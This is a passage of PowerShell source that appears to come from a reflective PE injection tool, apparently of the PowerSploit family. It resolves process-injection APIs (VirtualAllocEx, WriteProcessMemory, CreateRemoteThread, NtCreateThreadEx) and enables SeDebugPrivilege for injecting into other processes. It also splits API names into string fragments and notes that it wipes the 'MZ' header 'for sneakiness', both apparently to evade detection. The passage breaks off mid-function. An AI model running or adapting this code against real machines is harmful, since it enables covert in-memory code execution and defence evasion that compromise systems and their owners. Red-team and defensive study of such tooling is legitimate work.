		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

        Write-Verbose "[Get-ProcAddress] Module = $Module | Procedure=$Procedure"
        
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') };
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft'+'.Win32.'+'UnsafeNativeMethods');

		$a = 'Get' +'Module' + 'Handle'
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod($a);
        #Deal with the fact that windows now has two of these, we'll select the second one
		$b = 'get'+'proc'+'address'
        $x=$($UnsafeNativeMethods.GetMethods() | where-object {$_.name -eq $b });


        if(Get-Member -InputObject $x -Name Length -MemberType Properties) {
            #write-Verbose $x | format-table
            $GetProcAddress = $x[1];
        } else {		
            $GetProcAddress = $UnsafeNativeMethods.GetMethod("GetProcAddress");
        }
   				 
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))

	}
		
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}



	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object

		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
